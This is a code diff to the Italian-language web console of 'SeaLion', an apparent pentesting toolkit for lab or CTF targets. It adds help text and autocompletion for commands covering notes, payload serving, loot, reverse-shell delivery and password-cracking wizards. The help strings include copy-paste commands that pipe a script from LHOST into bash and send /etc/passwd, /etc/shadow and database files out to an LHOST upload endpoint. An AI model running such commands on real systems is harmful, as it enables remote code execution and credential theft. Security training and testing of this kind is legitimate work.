@@ -800,16 +800,146 @@ def _page_home() -> str:
 
   const HELP=
     '<span class="t-head">SeaLion Web — Comandi disponibili</span>\\n\\n'+
+    '<span class="t-head">  Docs</span>\\n'+
+    '  <span class="t-accent">notes</span>       <span class="t-line">Apri le guide di pentesting ({n_notes} disponibili)</span>\\n'+
+    '              <span class="t-line">Argomenti: footprinting, shells, password cracking, SSH, ecc.</span>\\n'+
+    '  <span class="t-accent">vuln</span>        <span class="t-line">Apri le cheatsheet per protocollo ({n_vulns} protocolli)</span>\\n'+
+    '              <span class="t-line">Ogni scheda ha: descrizione, porte, vuln comuni, comandi enum</span>\\n'+
+    '  <span class="t-accent">tools</span>       <span class="t-line">Documentazione e help dei tool installabili ({n_tools})</span>\\n'+
+    '              <span class="t-line">Ogni tool ha guida d\\\'uso, opzioni principali ed esempi</span>\\n\\n'+
+    '<span class="t-head">  Serve</span>\\n'+
+    '  <span class="t-accent">delivery</span>    <span class="t-line">Pannello comandi curl per post-exploitation</span>\\n'+
+    '              <span class="t-line">Reverse shell, upgrade TTY, upload file — comandi pronti da copiare</span>\\n'+
+    '  <span class="t-accent">logs</span>        <span class="t-line">Log delle richieste HTTP ricevute dal server</span>\\n\\n'+
+    '  <span class="t-line">Serve Operations</span>\\n'+
+    '  <span class="t-accent">static</span>      <span class="t-line">File manager per payload statici ({n_static} file)</span>\\n'+
+    '              <span class="t-line">Crea, importa, modifica e scarica file serviti su /static/</span>\\n'+
+    '  <span class="t-accent">loot</span>        <span class="t-line">File ricevuti dalla vulnbox ({n_loot} file)</span>\\n'+
+    '              <span class="t-line">Visualizza, scarica ed elimina i file caricati via curl /upload</span>\\n\\n'+
+    '<span class="t-head">  Wordlists</span>\\n'+
+    '  <span class="t-accent">wordfind</span>    <span class="t-line">Wizard wordlist — suggerisce liste e comandi per fuzzing/brute-force</span>\\n'+
+    '  <span class="t-accent">wordgen</span>     <span class="t-line">Wizard creazione wordlist personalizzate (cewl, crunch, ecc.)</span>\\n'+
+    '  <span class="t-accent">passfind</span>    <span class="t-line">Wizard password cracking — hash, file protetti, archivi, servizi</span>\\n\\n'+
+    '<span class="t-head">  Terminale</span>\\n'+
     '  <span class="t-accent">help</span>        <span class="t-line">Mostra questo messaggio</span>\\n'+
-    '  <span class="t-accent">notes</span>       <span class="t-line">Apri le guide ({n_notes})</span>\\n'+
-    '  <span class="t-accent">vuln</span>        <span class="t-line">Cheatsheet protocolli ({n_vulns})</span>\\n'+
-    '  <span class="t-accent">tools</span>       <span class="t-line">Documentazione tool ({n_tools})</span>\\n'+
-    '  <span class="t-accent">static</span>      <span class="t-line">File statici ({n_static})</span>\\n'+
-    '  <span class="t-accent">loot</span>        <span class="t-line">File dalla vulnbox ({n_loot})</span>\\n'+
-    '  <span class="t-accent">delivery</span>    <span class="t-line">Payload &amp; comandi curl</span>\\n'+
-    '  <span class="t-accent">logs</span>        <span class="t-line">Log del server</span>\\n'+
+    '  <span class="t-accent">help</span> <span class="t-line">&lt;cmd&gt;</span>  <span class="t-line">Dettagli su un comando (es. <span class="t-accent">help loot</span>)</span>\\n'+
     '  <span class="t-accent">version</span>     <span class="t-line">Versione SLConsole</span>\\n'+
     '  <span class="t-accent">clear</span>       <span class="t-line">Pulisci il terminale</span>\\n';
+
+  const CMD_HELP={{
+    notes:
+      '<span class="t-head">notes — Guide di Pentesting</span>\\n\\n'+
+      '<span class="t-line">Apre la sezione con {n_notes} guide scritte su argomenti di pentesting.</span>\\n'+
+      '<span class="t-line">Ogni guida copre metodologia, comandi utili e tool consigliati.</span>\\n\\n'+
+      '<span class="t-line">Argomenti disponibili: footprinting, info gathering, shells,</span>\\n'+
+      '<span class="t-line">password cracking, SSH, Impacket, network services, PowerShell.</span>\\n\\n'+
+      '<span class="t-line">Digitando <span class="t-accent">notes</span> verrai portato alla pagina delle guide.</span>',
+    vuln:
+      '<span class="t-head">vuln — Cheatsheet Protocolli</span>\\n\\n'+
+      '<span class="t-line">Apre la sezione con {n_vulns} cheatsheet, una per protocollo di rete.</span>\\n'+
+      '<span class="t-line">Ogni scheda include:</span>\\n'+
+      '<span class="t-line">  • Descrizione del servizio e porte standard</span>\\n'+
+      '<span class="t-line">  • Vulnerabilità comuni e vettori d\\\'attacco</span>\\n'+
+      '<span class="t-line">  • Comandi di enumerazione pronti da usare</span>\\n'+
+      '<span class="t-line">  • Tool consigliati per quel protocollo</span>\\n\\n'+
+      '<span class="t-line">Protocolli: FTP, SSH, SMTP, SMB, DNS, RDP, MySQL, MSSQL, NFS,</span>\\n'+
+      '<span class="t-line">SNMP, IPMI, IMAP/POP3, WinRM, WMI, Oracle TNS.</span>\\n\\n'+
+      '<span class="t-line">Digitando <span class="t-accent">vuln</span> verrai portato alla pagina delle cheatsheet.</span>',
+    tools:
+      '<span class="t-head">tools — Documentazione Tool</span>\\n\\n'+
+      '<span class="t-line">Apre la sezione con {n_tools} tool di sicurezza documentati.</span>\\n'+
+      '<span class="t-line">Per ogni tool trovi: descrizione, opzioni principali, esempi d\\\'uso</span>\\n'+
+      '<span class="t-line">e casi d\\\'uso comuni durante un engagement.</span>\\n\\n'+
+      '<span class="t-line">Categorie: recon, OSINT, fuzzing, enum, brute-force, exploit,</span>\\n'+
+      '<span class="t-line">post-exploitation, password cracking, wordlist.</span>\\n\\n'+
+      '<span class="t-line">Digitando <span class="t-accent">tools</span> verrai portato alla pagina dei tool.</span>',
+    static:
+      '<span class="t-head">static — File Manager Payload</span>\\n\\n'+
+      '<span class="t-line">Apre il file manager per i payload in <code>static/</code>.</span>\\n'+
+      '<span class="t-line">Da qui puoi creare, importare, modificare ed eliminare file</span>\\n'+
+      '<span class="t-line">che il server serve su <code>/static/&lt;nome&gt;</code>.</span>\\n\\n'+
+      '<span class="t-line">I file precaricati includono linpeas, linenum,</span>\\n'+
+      '<span class="t-line">linux-exploit-suggester e pspy.</span>\\n\\n'+
+      '<span class="t-line">Il target può scaricarli con:</span>\\n'+
+      '<span class="t-accent">  curl http://LHOST:2727/static/linpeas.sh | bash</span>\\n\\n'+
+      '<span class="t-line">Digitando <span class="t-accent">static</span> verrai portato al file manager.</span>',
+    loot:
+      '<span class="t-head">loot — File dalla Vulnbox</span>\\n\\n'+
+      '<span class="t-line">Apre la sezione con i file caricati dalla vulnbox ({n_loot} presenti).</span>\\n'+
+      '<span class="t-line">Da qui puoi visualizzare, scaricare ed eliminare ogni file.</span>\\n\\n'+
+      '<span class="t-line">Come caricare file dalla macchina vittima:</span>\\n'+
+      '<span class="t-accent">  curl -F \\"file=@/etc/passwd\\" http://LHOST:2727/upload</span>\\n'+
+      '<span class="t-accent">  cat /etc/shadow | curl -X POST -d @- http://LHOST:2727/upload/shadow.txt</span>\\n'+
+      '<span class="t-accent">  curl -T /tmp/db.sqlite http://LHOST:2727/upload/db.sqlite</span>\\n\\n'+
+      '<span class="t-line">I file vengono salvati in <code>loot/</code> con il formato:</span>\\n'+
+      '<span class="t-line">  <code>&lt;IP&gt;_&lt;DATA&gt;_&lt;ORA&gt;_&lt;NOME&gt;</code></span>\\n\\n'+
+      '<span class="t-line">Digitando <span class="t-accent">loot</span> verrai portato alla pagina loot.</span>',
+    delivery:
+      '<span class="t-head">delivery — Comandi Curl per Post-Exploitation</span>\\n\\n'+
+      '<span class="t-line">Apre il pannello con comandi curl pronti da copiare e incollare</span>\\n'+
+      '<span class="t-line">sulla macchina vittima durante la post-exploitation.</span>\\n\\n'+
+      '<span class="t-line">Sezioni disponibili:</span>\\n'+
+      '<span class="t-line">  • <span class="t-accent">/upgrade</span>  — Upgrade shell instabile a TTY interattiva (socat/python pty)</span>\\n'+
+      '<span class="t-line">  • <span class="t-accent">/upgrade2</span> — Upgrade in-place senza nuova connessione (8 metodi)</span>\\n'+
+      '<span class="t-line">  • <span class="t-accent">/rev</span>      — Reverse shell Bash</span>\\n'+
+      '<span class="t-line">  • <span class="t-accent">/sh</span>       — Reverse shell Python</span>\\n'+
+      '<span class="t-line">  • <span class="t-accent">/upload</span>   — Upload file dalla vittima</span>\\n\\n'+
+      '<span class="t-line">Ogni comando mostra LHOST e LPORT già configurati.</span>\\n\\n'+
+      '<span class="t-line">Digitando <span class="t-accent">delivery</span> verrai portato al pannello.</span>',
+    logs:
+      '<span class="t-head">logs — Log del Server</span>\\n\\n'+
+      '<span class="t-line">Apre la pagina con i log delle richieste HTTP ricevute.</span>\\n'+
+      '<span class="t-line">Utile per verificare che il target stia effettivamente</span>\\n'+
+      '<span class="t-line">scaricando i payload o caricando file.</span>\\n\\n'+
+      '<span class="t-line">Digitando <span class="t-accent">logs</span> verrai portato alla pagina dei log.</span>',
+    help:
+      '<span class="t-head">help — Aiuto Comandi</span>\\n\\n'+
+      '<span class="t-line">Mostra la lista dei comandi disponibili nel terminale SLWeb.</span>\\n\\n'+
+      '<span class="t-line">Uso:</span>\\n'+
+      '<span class="t-accent">  help</span>         <span class="t-line">Lista completa dei comandi</span>\\n'+
+      '<span class="t-accent">  help &lt;cmd&gt;</span>   <span class="t-line">Dettagli su un comando specifico</span>\\n\\n'+
+      '<span class="t-line">Esempio: <span class="t-accent">help loot</span>, <span class="t-accent">help delivery</span>, <span class="t-accent">help vuln</span></span>',
+    clear:
+      '<span class="t-head">clear — Pulisci Terminale</span>\\n\\n'+
+      '<span class="t-line">Svuota l\\\'output del terminale. Non cancella la cronologia</span>\\n'+
+      '<span class="t-line">dei comandi (puoi ancora usare ↑ ↓ per navigarla).</span>',
+    version:
+      '<span class="t-head">version — Versione</span>\\n\\n'+
+      '<span class="t-line">Mostra la versione attuale di SeaLion Console.</span>',
+    wordfind:
+      '<span class="t-head">wordfind — Wizard Wordlist</span>\\n\\n'+
+      '<span class="t-line">Wizard interattivo che suggerisce le wordlist più adatte</span>\\n'+
+      '<span class="t-line">dal catalogo SecLists per il target specificato.</span>\\n\\n'+
+      '<span class="t-line">Genera comandi pronti per:</span>\\n'+
+      '<span class="t-line">  • <span class="t-accent">Fuzzing</span> — gobuster, ffuf, wfuzz, feroxbuster, dirsearch</span>\\n'+
+      '<span class="t-line">  • <span class="t-accent">Brute-force</span> — hydra, medusa, ncrack, crackmapexec</span>\\n'+
+      '<span class="t-line">  • <span class="t-accent">Parameter discovery</span> — arjun</span>\\n\\n'+
+      '<span class="t-line">Uso nella console SLConsole:</span>\\n'+
+      '<span class="t-accent">  wordfind http://target.htb</span>',
+    wordgen:
+      '<span class="t-head">wordgen — Wizard Creazione Wordlist</span>\\n\\n'+
+      '<span class="t-line">Wizard interattivo per creare wordlist personalizzate</span>\\n'+
+      '<span class="t-line">a partire da informazioni raccolte sul target.</span>\\n\\n'+
+      '<span class="t-line">Metodi disponibili:</span>\\n'+
+      '<span class="t-line">  • <span class="t-accent">cewl</span> — estrae parole da un sito web</span>\\n'+
+      '<span class="t-line">  • <span class="t-accent">crunch</span> — genera combinazioni per pattern</span>\\n'+
+      '<span class="t-line">  • <span class="t-accent">cupp</span> — profilo personale del target</span>\\n'+
+      '<span class="t-line">  • <span class="t-accent">username-anarchy</span> — genera varianti di username</span>\\n\\n'+
+      '<span class="t-line">Uso nella console SLConsole:</span>\\n'+
+      '<span class="t-accent">  wordgen</span>',
+    passfind:
+      '<span class="t-head">passfind — Wizard Password Cracking</span>\\n\\n'+
+      '<span class="t-line">Wizard interattivo per il cracking di password.</span>\\n'+
+      '<span class="t-line">Guida passo-passo dalla scelta del tipo di hash/file</span>\\n'+
+      '<span class="t-line">fino al comando finale pronto da eseguire.</span>\\n\\n'+
+      '<span class="t-line">Categorie supportate:</span>\\n'+
+      '<span class="t-line">  • <span class="t-accent">Hash</span> — MD5, SHA, NTLM, bcrypt, ecc. (john/hashcat)</span>\\n'+
+      '<span class="t-line">  • <span class="t-accent">File protetti</span> — SSH key, PDF, Office, ZIP, KeePass</span>\\n'+
+      '<span class="t-line">  • <span class="t-accent">Archivi/dischi</span> — BitLocker, TrueCrypt, LUKS</span>\\n'+
+      '<span class="t-line">  • <span class="t-accent">Servizi di rete</span> — brute-force via hydra/medusa/ncrack</span>\\n\\n'+
+      '<span class="t-line">Uso nella console SLConsole:</span>\\n'+
+      '<span class="t-accent">  passfind</span>',
+  }};
 
   function echo(cmd,h){{
     out.innerHTML+=
@@ -822,11 +952,19 @@ def _page_home() -> str:
     const q=raw.trim();if(!q)return;
     hist.push(q);hpos=hist.length;
     const lo=q.toLowerCase();
+    const parts=lo.split(' ').filter(Boolean);
     const nav=cats.find(c=>c.name===lo||c.label.toLowerCase()===lo);
     if(nav){{location.href=nav.href;return;}}
-    if(lo==='help'||lo==='?')echo(q,HELP);
+    if(parts[0]==='help'&&parts.length>1){{
+      const sub=parts.slice(1).join(' ');
+      const h=CMD_HELP[sub];
+      if(h)echo(q,h);
+      else echo(q,'<span class="t-line">Comando sconosciuto: <span class="t-accent">'+sub.replace(/</g,'&lt;')+'</span>. Scrivi <span class="t-accent">help</span> per la lista.</span>');
+    }}
+    else if(lo==='help'||lo==='?')echo(q,HELP);
     else if(lo==='clear')out.innerHTML='';
     else if(lo==='version')echo(q,'<span class="t-grn">SeaLion Console v0.1.0</span>');
+    else if(CMD_HELP[lo])echo(q,CMD_HELP[lo]);
     else echo(q,'<span class="t-line">Comando sconosciuto: '+q.replace(/</g,'&lt;')+'. Scrivi <span class="t-accent">help</span> per la lista.</span>');
     input.value='';box.classList.remove('open');
   }}
@@ -848,14 +986,22 @@ def _page_home() -> str:
     }});
   }}
 
-  const allNames=[...cats.map(c=>c.name),'help','clear','version'];
+  const allNames=[...cats.map(c=>c.name),'wordfind','wordgen','passfind','help','clear','version'];
+  const helpSubs=Object.keys(CMD_HELP);
   function filter(){{
     const q=input.value.trim().toLowerCase();
     sel=-1;
     if(!q){{render(cats);return;}}
+    if(q.startsWith('help ')&&q.length>5){{
+      const sub=q.slice(5);
+      const matched=helpSubs.filter(n=>n.startsWith(sub)).map(n=>{{
+        return {{name:'help '+n,label:'help '+n,cnt:'Dettagli comando',href:null}};
+      }});
+      render(matched);return;
+    }}
     const merged=allNames.filter(n=>n.startsWith(q)).map(n=>{{
       const c=cats.find(x=>x.name===n);if(c)return c;
-      const lb={{help:'Mostra comandi',clear:'Pulisci terminale',version:'Versione'}};
+      const lb={{help:'Mostra comandi · help <cmd> per dettagli',clear:'Pulisci terminale',version:'Versione',wordfind:'Wizard wordlist fuzzing/brute-force',wordgen:'Wizard creazione wordlist',passfind:'Wizard password cracking'}};
       return {{name:n,label:n.charAt(0).toUpperCase()+n.slice(1),cnt:lb[n]||'',href:null}};
     }});
     render(merged);
